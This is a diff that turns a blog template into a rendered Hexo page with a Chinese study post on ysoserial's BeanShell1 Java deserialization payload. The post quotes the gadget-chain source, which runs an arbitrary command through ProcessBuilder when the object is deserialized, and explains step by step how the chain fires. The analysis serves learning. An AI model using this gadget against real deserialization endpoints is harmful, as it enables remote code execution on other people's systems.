@@ -1,38 +1,291 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
 
+  
+  <title>Java反序列化框架ysoserial学习 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="简介ysoserial是github上一个Java反序列化工具框架，它包含常见的Java反序列化类型，包含Jenkins，WebLogic及JBoss等反序列化漏洞的利用Payload，及其生成过程。今天分析的BeanShell1只是其中的一个例子，当中用到很多Java中比较高深的技术，学习反序列化的同时，一并学习下Java。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化框架ysoserial学习">
+<meta property="og:url" content="http://example.com/2017/09/17/Java-deserial-learning1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="简介ysoserial是github上一个Java反序列化工具框架，它包含常见的Java反序列化类型，包含Jenkins，WebLogic及JBoss等反序列化漏洞的利用Payload，及其生成过程。今天分析的BeanShell1只是其中的一个例子，当中用到很多Java中比较高深的技术，学习反序列化的同时，一并学习下Java。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2017-09-17T03:19:00.000Z">
+<meta property="article:modified_time" content="2020-12-04T23:40:50.429Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="安全学习">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
-{% block title %} {{ page.title }} | {{ config.title }} {% endblock %}
+<meta name="generator" content="Hexo 5.2.0"></head>
 
-{% block page_class %}page-post-detail{% endblock %}
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Java-deserial-learning1" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/09/17/Java-deserial-learning1/" class="article-date">
+  <time datetime="2017-09-17T03:19:00.000Z" itemprop="datePublished">2017-09-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Java反序列化框架ysoserial学习
+    </h1>
+  
 
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a>是github上一个Java反序列化工具框架，它包含常见的Java反序列化类型，包含Jenkins，WebLogic及JBoss等反序列化漏洞的利用Payload，及其生成过程。今天分析的BeanShell1只是其中的一个例子，当中用到很多Java中比较高深的技术，学习反序列化的同时，一并学习下Java。</p>
+<a id="more"></a>
+<h2 id="BeanShell1"><a href="#BeanShell1" class="headerlink" title="BeanShell1"></a>BeanShell1</h2><p>这个Payload是利用BeanShell实现的，实现过程也比较巧妙。BeanShel是Java的动态脚本解释器，可以让Java项脚本语言一样运行。开始我们的代码分析了，ysoserial可以从Github上clone，我是在Eclipse中编译的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">	public class BeanShell1 extends PayloadRunner implements ObjectPayload&lt;PriorityQueue&gt; &#123;</span><br><span class="line"></span><br><span class="line">    public PriorityQueue getObject(String command) throws Exception &#123;</span><br><span class="line">	&#x2F;&#x2F; BeanShell payload</span><br><span class="line">	String payload &#x3D; &quot;compare(Object foo, Object bar) &#123;new java.lang.ProcessBuilder(new String[]&#123;\&quot;&quot; + command + &quot;\&quot;&#125;).start();return new Integer(1);&#125;&quot;;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Create Interpreter</span><br><span class="line">	Interpreter i &#x3D; new Interpreter();</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Evaluate payload</span><br><span class="line">	i.eval(payload);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Create InvocationHandler</span><br><span class="line">	XThis xt &#x3D; new XThis(i.getNameSpace(), i);</span><br><span class="line">	InvocationHandler handler &#x3D; (InvocationHandler) Reflections.getField(xt.getClass(), &quot;invocationHandler&quot;).get(xt);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Create Comparator Proxy</span><br><span class="line">	Comparator comparator &#x3D; (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class&lt;?&gt;[]&#123;Comparator.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Prepare Trigger Gadget (will call Comparator.compare() during deserialization)</span><br><span class="line">	final PriorityQueue&lt;Object&gt; priorityQueue &#x3D; new PriorityQueue&lt;Object&gt;(2, comparator);</span><br><span class="line">	Object[] queue &#x3D; new Object[] &#123;1,1&#125;;</span><br><span class="line">	Reflections.setFieldValue(priorityQueue, &quot;queue&quot;, queue);</span><br><span class="line">	Reflections.setFieldValue(priorityQueue, &quot;size&quot;, 2);</span><br><span class="line"></span><br><span class="line">	return priorityQueue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(final String[] args) throws Exception &#123;</span><br><span class="line">	PayloadRunner.run(BeanShell1.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-{% block content %}
+<p>从代码可以看出，BeanShell1继承自PayloadRunner，实现了ObjectPayload接口。它定义了一个函数getObject,这个是接口ObjectPayload要求的，也是整个框架中的重要组成，后面会详细分析。同样还有一个静态的主函数main，作为程序运行的入口。<br>PayloadRunner并不是直接接受输入的命令，BeanShell1作为其子类，才是反序列化真正的入口。从代码的追开始看起。</p>
+<h2 id="BeanShell1的main函数"><a href="#BeanShell1的main函数" class="headerlink" title="BeanShell1的main函数"></a>BeanShell1的main函数</h2><p>真正的入口在BeanShell1中的main函数中，调用方式为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PayloadRunner.run(BeanShell1.class, args)</span><br></pre></td></tr></table></figure>
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+<p>args就是传入的命令了。BeanShell1是关键。BeanShell1.class的调用是用来获取BeanShell1这个类的运行时类。如果是一个对象实例的话，可以通过object.getClass()来获取。这个方法时定义在Object类中。运行时类Runtime Class是Java中很多黑魔法的开始，也使得Java功能强大的原因之一。这里，我们只需要记住，PayloadRunner.run接受的第1个参数是BeanShell1的运行时类就OK了。</p>
+<h2 id="PayloadRunner-run函数"><a href="#PayloadRunner-run函数" class="headerlink" title="PayloadRunner.run函数"></a>PayloadRunner.run函数</h2><p>开始跟踪PayloadRunner.run函数的调用轨迹。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public class PayloadRunner &#123;</span><br><span class="line">	public static void run(final Class&lt;? extends ObjectPayload&lt;?&gt;&gt; clazz, final String[] args) throws Exception &#123;</span><br><span class="line">		&#x2F;&#x2F; ensure payload generation doesn&#39;t throw an exception</span><br><span class="line">		byte[] serialized &#x3D; new ExecCheckingSecurityManager().wrap(new Callable&lt;byte[]&gt;()&#123;</span><br><span class="line">			public byte[] call() throws Exception &#123;</span><br><span class="line">				final String command &#x3D; args.length &gt; 0 &amp;&amp; args[0] !&#x3D; null ? args[0] : &quot;calc.exe&quot;;</span><br><span class="line"></span><br><span class="line">				System.out.println(&quot;generating payload object(s) for command: &#39;&quot; + command + &quot;&#39;&quot;);</span><br><span class="line"></span><br><span class="line">				ObjectPayload&lt;?&gt; payload &#x3D; clazz.newInstance();</span><br><span class="line">                final Object objBefore &#x3D; payload.getObject(command);</span><br><span class="line"></span><br><span class="line">				System.out.println(&quot;serializing payload&quot;);</span><br><span class="line">				byte[] ser &#x3D; Serializer.serialize(objBefore);</span><br><span class="line">				Utils.releasePayload(payload, objBefore);</span><br><span class="line">                return ser;</span><br><span class="line">		&#125;&#125;);</span><br><span class="line"></span><br><span class="line">		try &#123;</span><br><span class="line">			System.out.println(&quot;deserializing payload&quot;);</span><br><span class="line">			final Object objAfter &#x3D; Deserializer.deserialize(serialized);</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+<p>从代码中看出这个函数很小，功能很简单，生成了Payload的序列化字节码serialized ，交由Deserializer进行反序列化，触发Payload执行。下面来看具体的生成流程。</p>
+<h3 id="字节码的生成"><a href="#字节码的生成" class="headerlink" title="字节码的生成"></a>字节码的生成</h3><ul>
+<li>通过包装函数ExecCheckingSecurityManager了一段代码，为什么要加一个层安全管理，这个现在还不知道。一定有它的原因，随后再学习了。</li>
+<li>判断传入的args,生成命令字符串。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectPayload&lt;?&gt; payload &#x3D; clazz.newInstance();</span><br><span class="line">final Object objBefore &#x3D; payload.getObject(command);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>首先通过运行时类，直接获取一个对象实例，然后，调用getObject函数，生成待序列化的对象。  </li>
+<li>getObject函数<br>getObject函数定义在BeanShell1中，因为BeanShell1实现了ObjectPayload接口，所以一定要定义getObject函数，这也是yso反序列化框架里最最重的一个函数。  </li>
+</ul>
+<ol>
+<li>首先生成了payload字符串，也就是要执行的命令，这里可以看到是一个Java的函数的文本形式。</li>
+<li>下面生成了一个BeanShell的解释器Interpreter实例，BeanShell是Java的一个工具包，用来以脚本形式来执行Java代码的方式。当然可以把它嵌入到正常的Java代码中去，这就是bsh.Interpreter.</li>
+<li>调用实例的eval函数来解析payload，当然解析成功也不会执行，因为是一个函数，而且记着我们现在是getObject中，正在生成payload序列过程中，此时当然不能执行命令了。我们需要的是在反序列化时执行命令。<br>可以这样理解，当BeanShell解析过payload后，只是在解析器实例的命名空间中生成了一个函数。我们也知道了，执行命令的关键在于如何触发这个函数的执行。</li>
+<li>下面一行，生成了一个XThis实例，代码里的注释告诉我们，这是为了创建一个触发器InovcationHandler，通过查看源码我们知道XThis实例就代表了那段解析过的payload，也就是说生成那个compare函数，就是XThis实例的函数了。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InvocationHandler handler &#x3D; (InvocationHandler) Reflections.getField(xt.getClass(), &quot;invocationHandler&quot;).get(xt);</span><br></pre></td></tr></table></figure>
+
+<p>这行代码就是链式调用，首先是调用getFileld函数，得到invocationHandler的成员(Field类实例)，通过查看源码，可以知道，XThis对象是有一个公有成员，invocationHandler的，我们知道，一个类的实例的成员，是不能直接访问的，要通过obj.member，这样的形式访问的，这里应该是Java的一个黑魔法之一，可以直接访问一个对象的对象实例。至于这是怎么实现的，后面再研究了。<br>返回了这个对象的Field实例后，又调用了Field的get函数，想必这就是返回真正的InvocationHandler 对象了，果不其然，在XThis中，invocationHandler成员的类型正是InvocationHandler接口。<br>也就是说InvocationHandler在被调用时，会自动调用它的函数invoke。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Comparator comparator &#x3D; (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class&lt;?&gt;[]&#123;Comparator.class&#125;, handler);</span><br></pre></td></tr></table></figure>
+
+<p>这段代码生成了一比较器代理，用于随后的优先队列。<br>5. 最后的反序列对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">final PriorityQueue&lt;Object&gt; priorityQueue &#x3D; new PriorityQueue&lt;Object&gt;(2, comparator);</span><br><span class="line">			Object[] queue &#x3D; new Object[] &#123;1,1&#125;;</span><br><span class="line">			Reflections.setFieldValue(priorityQueue, &quot;queue&quot;, queue);</span><br><span class="line">			Reflections.setFieldValue(priorityQueue, &quot;size&quot;, 2);</span><br></pre></td></tr></table></figure>
+
+<p>剩下的就比较好理解了，生成了一个优先队列，设定它的比较器为刚刚生成的比较器，给它添加了两个对象成员。为什么要添加两个对象呢，因为我们要触发comparator函数，优先队列有两个元素时，会自动触发一次比较。<br>然后返回这个对象。</p>
+<h3 id="生成序列码"><a href="#生成序列码" class="headerlink" title="生成序列码"></a>生成序列码</h3><p>根据返回的优先队列的对象，进行序列化，生成了序列化字节码，用于后面的反序列化。</p>
+<h3 id="进行反序列化操作"><a href="#进行反序列化操作" class="headerlink" title="进行反序列化操作"></a>进行反序列化操作</h3><p>PayloadRunner.run函数最后对生成的序列化字节码进行反序列化操作。触发命令执行。</p>
+<h2 id="命令执行的触发流程"><a href="#命令执行的触发流程" class="headerlink" title="命令执行的触发流程"></a>命令执行的触发流程</h2><p>最后也时最精彩的部分了，反序列化时，生成了一个优先队列对象，然后恢复这个对象里的数据，因为在生成序列化对象时，我们给它里面塞了两个对象。当它恢复时，它自动执行了comapator代理的invocationHandler，也就执行了BeanShell1中动态添加的方法，从前面流程可以看到，我们定义在这个函数里的命令，也就会得到执行了。<br>这也是这个漏洞利用的最巧妙的地方。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整个命令执行的过程比较简单，但其中用到几个Java高级技术，还需要进一步学习。</p>
+<ol>
+<li>Reflections机制，如何把一个对象的成员单独拎出来，可以将由其他对象访问。</li>
+<li>InvocationHandler接口，一般来说接口是不能实例化的，但在代码中看到了把一个对象转化为接口实例。</li>
+<li>Java的代理机制。</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/09/17/Java-deserial-learning1/" data-id="ckiaww49n0007bofz883n5uxj" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" rel="tag">安全学习</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/10/01/java-reflection-learn-md/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Java反射机制学习
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/07/31/how-to-learn-JavaScript/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">how to learn JavaScript？</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CSS%E5%AE%9A%E4%BD%8D/">CSS定位</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CSS%E5%AE%9A%E4%BD%8D/%E7%BF%BB%E8%AF%91/">翻译</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSS%E5%B8%83%E5%B1%80/">CSS布局</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CSS%E5%B8%83%E5%B1%80/%E7%BF%BB%E8%AF%91/">翻译</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSS%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/">CSS盒子模型</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/linux/tcp-ip/">tcp/ip</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/think/">think</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/CRC/">CRC</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/PPTV%E9%9D%A2%E8%AF%95/">PPTV面试</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%B1%BB/">类</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%B1%BB/%E7%BF%BB%E8%AF%91/">翻译</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/">系统运维</a></li></ul>
     </div>
   </div>
 
-{% endblock %}
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CRC/" rel="tag">CRC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSS/" rel="tag">CSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSS%E5%AE%9A%E4%BD%8D/" rel="tag">CSS定位</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSS%E5%B1%9E%E6%80%A7/" rel="tag">CSS属性</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSS%E5%B8%83%E5%B1%80/" rel="tag">CSS布局</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSS%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/" rel="tag">CSS盒子模型</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80/" rel="tag">C语言</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LVS/" rel="tag">LVS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OS/" rel="tag">OS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PPTV%E9%9D%A2%E8%AF%95/" rel="tag">PPTV面试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Paramiko/" rel="tag">Paramiko</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PhantomJS/" rel="tag">PhantomJS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcp-ip/" rel="tag">tcp/ip</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/think/" rel="tag">think</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%BB%E6%9C%BA%E5%AD%98%E6%B4%BB%E6%8E%A2%E6%B5%8B/" rel="tag">主机存活探测</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E6%A0%B8/" rel="tag">内核</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" rel="tag">安全学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" rel="tag">操作系统</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96/" rel="tag">数据提取</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/" rel="tag">文件系统</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/" rel="tag">服务器配置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" rel="tag">正则表达式</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B1%87%E7%BC%96/" rel="tag">汇编</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B3%A8%E8%A7%A3/" rel="tag">注解</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%B1%BB/" rel="tag">类</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/" rel="tag">编程学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/" rel="tag">网络爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E8%B5%84%E4%BA%A7/" rel="tag">网络资产</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BF%BB%E8%AF%91/" rel="tag">翻译</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%BF%90%E7%BB%B4/" rel="tag">运维</a></li></ul>
+    </div>
+  </div>
 
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CRC/" style="font-size: 10px;">CRC</a> <a href="/tags/CSS/" style="font-size: 16.67px;">CSS</a> <a href="/tags/CSS%E5%AE%9A%E4%BD%8D/" style="font-size: 10px;">CSS定位</a> <a href="/tags/CSS%E5%B1%9E%E6%80%A7/" style="font-size: 13.33px;">CSS属性</a> <a href="/tags/CSS%E5%B8%83%E5%B1%80/" style="font-size: 10px;">CSS布局</a> <a href="/tags/CSS%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/" style="font-size: 10px;">CSS盒子模型</a> <a href="/tags/CTF/" style="font-size: 16.67px;">CTF</a> <a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 10px;">C语言</a> <a href="/tags/Java/" style="font-size: 16.67px;">Java</a> <a href="/tags/LVS/" style="font-size: 10px;">LVS</a> <a href="/tags/Linux/" style="font-size: 16.67px;">Linux</a> <a href="/tags/OS/" style="font-size: 10px;">OS</a> <a href="/tags/PPTV%E9%9D%A2%E8%AF%95/" style="font-size: 10px;">PPTV面试</a> <a href="/tags/PWN/" style="font-size: 13.33px;">PWN</a> <a href="/tags/Paramiko/" style="font-size: 10px;">Paramiko</a> <a href="/tags/PhantomJS/" style="font-size: 10px;">PhantomJS</a> <a href="/tags/Python/" style="font-size: 13.33px;">Python</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/tcp-ip/" style="font-size: 10px;">tcp/ip</a> <a href="/tags/think/" style="font-size: 10px;">think</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/%E4%B8%BB%E6%9C%BA%E5%AD%98%E6%B4%BB%E6%8E%A2%E6%B5%8B/" style="font-size: 10px;">主机存活探测</a> <a href="/tags/%E5%86%85%E6%A0%B8/" style="font-size: 10px;">内核</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 10px;">安全学习</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 10px;">操作系统</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96/" style="font-size: 10px;">数据提取</a> <a href="/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/" style="font-size: 10px;">文件系统</a> <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/" style="font-size: 10px;">服务器配置</a> <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" style="font-size: 10px;">正则表达式</a> <a href="/tags/%E6%B1%87%E7%BC%96/" style="font-size: 10px;">汇编</a> <a href="/tags/%E6%B3%A8%E8%A7%A3/" style="font-size: 10px;">注解</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 13.33px;">算法</a> <a href="/tags/%E7%B1%BB/" style="font-size: 10px;">类</a> <a href="/tags/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/" style="font-size: 13.33px;">编程学习</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/" style="font-size: 10px;">网络爬虫</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E8%B5%84%E4%BA%A7/" style="font-size: 10px;">网络资产</a> <a href="/tags/%E7%BF%BB%E8%AF%91/" style="font-size: 20px;">翻译</a> <a href="/tags/%E8%BF%90%E7%BB%B4/" style="font-size: 10px;">运维</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/10/">October 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a 